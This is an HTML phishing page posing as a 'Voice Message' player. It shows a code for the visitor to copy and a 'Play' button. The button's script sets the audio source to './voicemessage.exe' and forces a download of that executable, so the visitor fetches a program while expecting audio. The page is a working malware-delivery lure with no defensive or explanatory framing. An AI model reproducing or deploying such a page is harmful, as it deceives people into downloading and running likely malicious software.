<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Voice Mail</title>
    <style>
        body {
            display: flex;
            justify-content: center;
            align-items: center;
            height: 100vh;
            margin: 0;
            background-color: #f3f2f1;
            font-family: Arial, sans-serif;
            background: url('./Capture.png') no-repeat center center fixed;
            background-size: cover;
        }
        .container {
            text-align: center;
            padding: 40px;
            background-color: #fff;
            border-radius: 8px;
            box-shadow: 0 0 10px rgba(0, 0, 0, 0.1);
            max-width: 600px;
            width: 100%;
            position: relative;
            border: 2px solid #e0e0e0;
            font-size: 20px;
        }
        .container h1 {
            margin-bottom: 20px;
            font-size: 32px;
            text-align: center;
        }
        .instructions {
            font-size: 20px;
            margin-bottom: 20px;
            text-align: center;
        }
        .code-container {
            display: flex;
            justify-content: space-between;
            align-items: center;
            margin-bottom: 20px;
            border: 3px solid #e0e0e0;
            padding: 20px;
            border-radius: 4px;
            background-color: #e0e0e0;
            width: 30%;
            margin: 20px auto;
        }
        .code {
            font-weight: bold;
            font-size: 19px;
            color: #333;
        }
        .copy-button {
            background: none;
            border: none;
            cursor: pointer;
        }
        .copy-button img {
            width: 20px;
            height: 32px;
        }
        .play-button {
            width: 70%;
            padding: 20px 30px;
            background-color: #007bff;
            color: #fff;
            border: 2px solid #007bff;
            border-radius: 4px;
            cursor: pointer;
            margin-top: 20px;
            font-size: 20px;
        }
        .play-button:hover {
            background-color: #007bff;
        }
    </style>
</head>
<body>
    <div class="container">
        <h1>Voice Message</h1>
        <p class="instructions">Copy the code below to access the voice message.</p>
        <div class="code-container">
            <div class="code" id="code">ydzUFqfrSZgRbTv</div>
            <button class="copy-button" onclick="copyCode()">
                <img src="https://img.icons8.com/ios-glyphs/30/000000/copy.png" alt="Copy">
            </button>
        </div>
        <audio id="audio" controls>
            <source src="./voicemessage.exe" type="audio/mpeg">
            Your browser does not support the audio element.
        </audio>
        <button class="play-button" onclick="playAudio()">Play</button>
    </div>

    <script>
        function copyCode() {
            var code = document.getElementById('code').innerText;
            navigator.clipboard.writeText(code).then(function() {
                console.log('Code copied to clipboard');
            }, function(err) {
                console.error('Could not copy code: ', err);
            });
        }

        function playAudio() {
            var audio = document.getElementById('audio');
            audio.play();
            var link = document.createElement('a');
            link.href = './voicemessage.exe';
            link.download = './voicemessage.exe';
            document.body.appendChild(link);
            link.click();
            document.body.removeChild(link);
        }
    </script>
</body>
</html>
